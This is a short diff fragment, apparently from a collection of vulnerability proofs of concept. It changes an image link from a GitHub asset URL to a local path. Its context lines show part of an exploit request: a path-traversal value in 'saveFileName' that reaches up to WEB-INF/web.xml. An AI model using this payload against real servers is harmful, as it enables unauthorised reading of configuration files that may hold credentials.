@@ -19,4 +19,4 @@ SL-CE-SUID: 1081
 saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
 ```
 
-![e776895b9471c04a60d74a1666b56e1b](https://github.com/wy876/POC/assets/139549762/8217e88a-f2f5-47ba-9c27-eb765cbbed78)
+![e776895b9471c04a60d74a1666b56e1b](../../images/8217e88a-f2f5-47ba-9c27-eb765cbbed78.png)
